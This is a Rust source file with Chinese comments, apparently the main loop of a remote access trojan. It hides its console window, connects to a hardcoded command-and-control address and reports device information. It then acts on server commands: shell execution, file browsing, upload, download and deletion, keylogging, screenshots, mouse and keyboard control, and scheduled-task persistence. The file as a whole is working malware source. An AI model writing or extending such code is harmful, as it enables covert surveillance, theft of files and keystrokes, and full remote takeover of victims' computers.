// 隐藏windows下的命令行框
#![windows_subsystem = "windows"]

use core::time;
use std::{net::TcpStream, thread::{self}, io::{Read}, time::Duration};
use model::command_model::CommandModel;
use utils::{device_util::DeviceUtil, query_util::QueryUtil, file_parse::FileParse, other::Other};

use crate::{utils::{cmd_parse, file_parse, socket_util::SocketUtil}};
// use utils::thread_pool::ThreadPool;

mod utils;
mod model;

// 压缩
use std::alloc::System;
#[global_allocator]
static A: System = System;

// 是否在进行文件传输操作
// static mut writing: bool = false;

fn main() {
    // embed_resource::compile("./icon.rc");
    // #[cfg(windows)]{
    //     let mut res = winres::WindowsResource::new();
    //     res.set_icon("test.ico");
    //     res.compile().unwrap();
    // }
    // 运行环境检测
    Other::init_check();
    // Other::check_tasksch();
    // Other::create_tasksch();
    // 1.尝试连接C&C
    let mut stream: TcpStream = get_connect();
    // 2.发送设备信息
    QueryUtil::query_info(&mut stream);
    // 3.开始监听服务器数据传输
    let mut buffer = [0; 65536];
    loop {
        let mut json_str = String::new();
        let mut read_size = stream.read(&mut buffer).unwrap();
        // 有数据回传
        while read_size > 0 {
            // 只留下读取到的数据
            let request_json = String::from_utf8_lossy(&buffer[..read_size]);
            // println!("{:?}", request_json);
            // 传输的是字节数据
            if !request_json.starts_with("{") {
                FileParse::write_byte(buffer, read_size).unwrap();
                // 防止循环bug
                read_size = 0;
                break;
            }else{
                json_str.push_str(&request_json.to_string());
                break;
            }
        }
        if read_size > 0 {
            match handler(&json_str, &mut stream) {
                Ok(_) => {
                    // println!("success!");
                    json_str.clear()
                },
                Err(err) => SocketUtil::send_error_server(err.to_string(), &mut stream),
            }
        }
    }
}

fn get_connect() -> TcpStream {
    match TcpStream::connect("192.168.3.217:9527") {
        Ok(stream) => stream,
        Err(_) => {
            // 休眠五秒尝试继续链接
            // print!("try connect");
            thread::sleep(time::Duration::from_secs(5));
            get_connect()
        }
    }
}
// 处理数据
fn handler(data: &str, stream: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    // 尝试对json进行转换，失败则返回一个错误的提示模型对象
    // let mut command_model: CommandModel = match serde_json::from_str(&data) {
    //     Ok(res) => res,
    //     // println!("receiver {:?}\n", res);
    //     Err(err) => {
    //         CommandModel::new(
    //             stream.local_addr().unwrap().to_string(),
    //             String::from("*"), 
    //             0,
    //             2,
    //             String::from(err.to_string()))
    //     }
    // };
    let mut command_model: CommandModel = serde_json::from_str(&data)?;
    // println!("{:?}", command_model);
    // 解析json成功，对操作类型进行匹配处理
    match command_model.c_type {
        // 解析失败了之后的默认模型对象
        0 => Ok(SocketUtil::send_to_server(serde_json::to_string(&command_model).unwrap(), stream)),
        // 命令执行相关操作
        1 => Ok(cmd_parse::CommandParse::parse(&mut command_model, stream)),
        // 文件相关操作
        2 => {
            match command_model.action {
                // 获得硬盘列表
                0 => Ok(file_parse::FileParse::get_disk_list(command_model, stream)),
                // 获得目录文件列表
                1 => match file_parse::FileParse::get_dir_list(command_model) {
                    Ok(res) => Ok(SocketUtil::send_to_server(res, stream)),
                    Err(err) => Err(err)
                },
                // 文件下载
                3 => match file_parse::FileParse::file_to_bytes(command_model, stream) {
                    Ok(_) => Ok(()),
                    Err(err) => Err(err)
                },
                // 文件上传
                4 => match file_parse::FileParse::bytes_to_file(command_model) {
                    Ok(_) => Ok(()),
                    Err(err) => Err(err)
                },
                // 文件/目录删除
                5 => match file_parse::FileParse::remove_file_or_dir(command_model) {
                    Ok(data) => Ok(SocketUtil::send_to_server(data, stream)),
                    Err(err) => Err(err),
                },
                _ => Ok(SocketUtil::send_error_server(String::from("unknow command!"), stream))
            }
        }
        // 硬件相关操作
        3 => {
            match command_model.action {
                1 => Ok(DeviceUtil::key_listener(command_model, stream)),
                4 => Ok(DeviceUtil::screen_shot(command_model, stream)),
                5 => Ok(DeviceUtil::move_mouse(command_model)?),
                6 => Ok(DeviceUtil::click_mouse(command_model)),
                // 7 => Ok(DeviceUtil::take_picture(command_model, stream)?),
                8 => Ok(DeviceUtil::parse_keyboard_sequence(command_model, stream)?),
                _ => Ok(SocketUtil::send_error_server(String::from("unknow command!"), stream))
            }
        }
        4 => Ok(Other::create_tasksch(command_model, stream)),
        // 查询设备的一些硬件信息
        _ => Ok(SocketUtil::send_error_server(String::from("unknow command!"), stream))
    }
}